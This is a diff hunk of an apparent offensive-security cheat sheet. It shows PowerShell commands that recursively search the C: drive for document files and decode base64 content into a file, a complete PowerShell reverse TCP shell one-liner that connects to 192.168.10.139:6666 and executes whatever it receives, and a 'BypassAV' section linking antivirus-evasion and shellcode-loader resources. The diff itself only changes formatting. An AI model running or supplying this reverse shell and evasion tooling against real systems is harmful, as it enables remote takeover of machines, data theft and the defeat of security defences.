@@ -67,11 +67,9 @@ powershell.exe -command "Get-ChildItem -Path C:\ -Recurse –Include .txt,.doc,.
 
 write file
 powershell.exe -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("......")) | Set-Content testfoo.txt"
-```
-## reverse tcp shell
-```command
-nc -lvp 6666
 
+reverse tcp shell
+nc -lvp 6666
 powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.10.139',6666);$stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
@@ -81,9 +79,9 @@ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 # BypassAV
 ```command
-https://github.com/TideSec/BypassAntiVirus
-https://github.com/clinicallyinane/shellcode_launcher/
-https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html
+[]https://github.com/TideSec/BypassAntiVirus
+[]https://github.com/clinicallyinane/shellcode_launcher/
+[]https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html
 ```
 
 # Persistence
